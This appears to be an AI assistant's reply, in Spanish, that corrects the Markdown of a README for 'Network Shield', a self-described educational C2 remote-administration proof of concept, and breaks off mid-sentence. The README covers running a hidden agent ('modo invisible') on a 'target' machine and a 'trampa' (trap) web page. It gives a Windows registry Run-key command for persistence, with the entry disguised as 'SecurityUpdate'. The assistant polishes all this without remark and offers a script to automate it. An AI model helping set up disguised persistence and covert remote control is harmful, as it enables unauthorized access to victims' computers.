Entiendo perfectamente el problema. El editor está "succionando" todo el texto dentro del bloque de código porque no detecta el cierre correcto del bloque anterior. En Markdown, si no cierras con ``` y dejas una línea en blanco, todo lo que sigue se vuelve parte del código gris.Aquí tienes el código corregido de nuevo, con saltos de línea extra para asegurar que cada sección se mantenga en su sitio.📄 Borra todo y pega este código (es la versión definitiva):Markdown# 🛡️ Network Shield - Remote Administration System (PoC)

Este proyecto es una **Prueba de Concepto (PoC)** diseñada para estudiar el funcionamiento de los sistemas de administración remota (C2) y las técnicas de persistencia en entornos Windows.

> [!CAUTION]
> **⚠️ AVISO LEGAL:** Este software ha sido creado exclusivamente con fines educativos y de investigación en ciberseguridad. El autor no se hace responsable del mal uso de este código. El uso en sistemas sin autorización es ilegal.

---

## 🛠️ Requisitos del Sistema

* **XAMPP**: Servidor Apache y MySQL (MariaDB).
* **Python 3.x**: Instalado en el PATH.
* **Librerías**: Ejecuta `pip install requests` en tu terminal.
* **Base de Datos**: Importar el esquema incluido en `server/db.txt`.

---

## 🚀 Guía de Instalación y Configuración

### 1. Preparación de la Base de Datos
1. Inicia **Apache** y **MySQL** desde el panel de XAMPP.
2. Accede a `http://localhost/phpmyadmin`.
3. Crea una base de datos llamada `network_shield_db`.
4. Importa el contenido de `server/db.txt` en la pestaña **SQL**.

### 2. Configuración del Servidor Web
1. Mueve la carpeta `Network-Shield-System` a `C:\xampp\htdocs\`.
2. El panel será accesible en: `http://localhost/Network-Shield-System/server/index.php`.

---

## 📡 Ejecución y Pruebas

Sigue este orden estricto para establecer el enlace:

### 🟢 Paso 1: Iniciar el Receptor (Master)
Abre una terminal en la carpeta `master/` y lanza el centro de control:

```bash
python receptor.py
🔵 Paso 2: Lanzar el Agente (Client)
Ejecuta el script en el equipo objetivo para iniciar la conexión:

Modo Manual: python client/agente.py

Modo Invisible: Renombra a agente.pyw y ejecútalo.

Simulación Web: Accede a http://localhost/Network-Shield-System/server/trampa.php

🔐 Implementación de Persistencia
1️⃣ Instalación (Crear Registro)
Envía este comando desde la terminal del receptor para que el agente inicie con Windows:

DOS

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "pythonw.exe C:\xampp\htdocs\Network-Shield-System\client\agente.pyw" /f
2️⃣ Comprobación (Verificar Estado)
Para confirmar que el registro se ha creado correctamente, ejecuta:

DOS

reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate"
3️⃣ Eliminación (Limpieza del Sistema)
Para desactivar el inicio automático y dejar el sistema limpio, ejecuta:

DOS

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /f

---

### 🛠️ ¿Qué hemos arreglado?
1.  **El Cierre**: He añadido ` ``` ` justo después de cada comando. Sin esto, el "Paso 2" se metía dentro del cuadro gris del "Paso 1".
2.  **Líneas en blanco**: He dejado un espacio físico (Enter) entre el cuadro de código y el siguiente título. Esto es vital en Markdown para que se vean como secciones separadas.
3.  **Estética**: He usado el mismo estilo de títulos (`###`) e iconos para que el Paso 2 y la sección de Persistencia tengan la misma jerarquía visual que el Paso 1.

**¿Te gustaría que te genere ahora un pequeño script `.bat` que haga todos estos pasos de l
